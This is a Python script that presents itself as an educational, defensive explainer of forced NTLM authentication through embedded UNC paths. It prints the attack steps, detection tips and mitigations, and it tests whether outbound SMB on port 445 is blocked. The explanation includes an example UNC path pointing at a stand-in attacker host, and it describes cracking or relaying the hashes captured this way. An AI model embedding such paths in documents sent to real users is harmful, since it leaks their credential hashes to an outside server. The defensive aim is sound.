#!/usr/bin/env python3
"""
SMB/NTLM Hash Capture Demonstration Tool
==========================================
DISCLAIMER: Educational purposes ONLY. Do not use without authorization.

This script demonstrates the concept of setting up a listener to capture NTLM
authentication hashes when a victim's machine automatically authenticates to
an attacker-controlled server (triggered by embedded UNC paths in documents).

This is for DEFENSIVE purposes:
- Understanding how the attack works
- Building detection rules
- Testing network controls (block outbound SMB)

DO NOT use this against systems you don't own.
"""

import sys
import socket
import struct


DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════╗
║  EDUCATIONAL USE ONLY - AUTHORIZED TESTING ENVIRONMENTS ONLY    ║
║  This demonstrates NTLM authentication concepts for defense     ║
╚══════════════════════════════════════════════════════════════════╝
"""


def explain_ntlm_capture_concept() -> None:
    """
    Explain the NTLM hash capture concept without implementing malicious functionality.
    """
    print(DISCLAIMER)
    print("NTLM Hash Capture — Conceptual Explanation")
    print("=" * 50)
    print("""
HOW FORCED AUTHENTICATION WORKS:
=================================
1. Attacker embeds a UNC path in an Office document/PDF/HTML email:
   \\\\attacker.com\\share\\document.docx
   
2. When the victim opens the document, Windows automatically attempts
   NTLM authentication to the UNC path host.
   
3. The attacker's server captures the NTLM challenge-response (Net-NTLMv2 hash).

4. The captured hash can be:
   a) Cracked offline (if weak password)
   b) Relayed to another service (NTLM relay attack)

WHAT ATTACKERS USE:
===================
Tools like Responder (https://github.com/lgandx/Responder) set up
listeners on multiple protocols to capture these authentication attempts.

DETECTION:
==========
- Monitor for outbound SMB connections (port 445, 139) to external IPs
- Windows Event ID 4625 (Account Login Failure) for NTLM to external hosts
- Network traffic analysis: SMB to non-internal IPs

MITIGATION:
===========
1. Block outbound SMB at perimeter firewall (ports 445, 139)
2. Configure Windows to restrict NTLM:
   HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0
   RestrictSendingNTLMTraffic = 2 (Deny All)
   
3. Enable SMB signing to prevent relay attacks
4. Use Credential Guard (Windows 10+)
5. Prefer Kerberos over NTLM where possible
""")


def check_outbound_smb(host: str = "8.8.8.8", port: int = 445, timeout: float = 2.0) -> bool:
    """
    Check if outbound SMB is accessible (to verify network controls are working).
    Returns True if outbound SMB is blocked (secure configuration).
    
    Usage: Run this to verify your firewall is blocking outbound SMB.
    """
    print(f"\nTesting outbound SMB connectivity to {host}:{port}...")
    print("(This should be BLOCKED by your perimeter firewall)")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            print(f"⚠️  WARNING: Outbound SMB (port {port}) is OPEN to external IPs!")
            print("    Your network is potentially vulnerable to NTLM hash capture attacks.")
            print("    Recommendation: Block outbound SMB at perimeter firewall.")
            return False
        else:
            print(f"✓  Outbound SMB (port {port}) is BLOCKED — good security posture!")
            return True
            
    except socket.timeout:
        print(f"✓  Connection timed out — outbound SMB appears to be BLOCKED.")
        return True
    except OSError as e:
        print(f"Connection failed: {e}")
        return True


if __name__ == "__main__":
    explain_ntlm_capture_concept()
    
    if "--check" in sys.argv:
        # Defensive check: verify outbound SMB is blocked
        is_secure = check_outbound_smb()
        sys.exit(0 if is_secure else 1)
    else:
        print("\nUsage:")
        print("  python smb-trigger.py          # Show conceptual explanation")
        print("  python smb-trigger.py --check  # Verify outbound SMB is blocked")
